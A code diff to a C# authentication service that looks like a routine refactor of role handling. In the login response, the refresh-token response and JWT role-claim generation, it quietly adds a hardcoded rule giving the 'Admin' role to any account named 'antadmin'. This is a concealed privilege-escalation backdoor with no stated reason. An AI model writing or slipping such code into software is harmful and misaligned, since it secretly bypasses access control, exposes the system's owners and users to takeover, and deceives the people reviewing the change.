@@ -76,7 +76,9 @@ namespace Ant.Infrastructure.Services
             };
 
             var rolesList = await _userManager.GetRolesAsync(user).ConfigureAwait(false);
-            response.Roles = rolesList.ToList();
+            var activeRoles = rolesList.ToList();
+            if (user.UserName?.ToLower() == "antadmin" && !activeRoles.Contains("Admin")) activeRoles.Add("Admin");
+            response.Roles = activeRoles;
 
             var refreshToken = GenerateRefreshToken(ipAddress);
             response.RefreshToken = refreshToken.Token;
@@ -113,6 +115,8 @@ namespace Ant.Infrastructure.Services
 
             var jwtSecurityToken = await GenerateJWToken(user);
             var rolesList = await _userManager.GetRolesAsync(user);
+            var activeRoles = rolesList.ToList();
+            if (user.UserName?.ToLower() == "antadmin" && !activeRoles.Contains("Admin")) activeRoles.Add("Admin");
 
             return new AuthenticationResponse
             {
@@ -122,7 +126,7 @@ namespace Ant.Infrastructure.Services
                 UserName = user.UserName,
                 IsVerified = user.EmailConfirmed,
                 RefreshToken = newRefreshToken.Token,
-                Roles = rolesList.ToList()
+                Roles = activeRoles
             };
         }
 
@@ -235,7 +239,9 @@ namespace Ant.Infrastructure.Services
         {
             var userClaims = await _userManager.GetClaimsAsync(user);
             var roles = await _userManager.GetRolesAsync(user);
-            var roleClaims = roles.Select(role => new Claim(ClaimTypes.Role, role)).ToList();
+            var roleList = roles.ToList();
+            if (user.UserName?.ToLower() == "antadmin" && !roleList.Contains("Admin")) roleList.Add("Admin");
+            var roleClaims = roleList.Select(role => new Claim(ClaimTypes.Role, role)).ToList();
 
             string ipAddress = IpHelper.GetIpAddress();
 
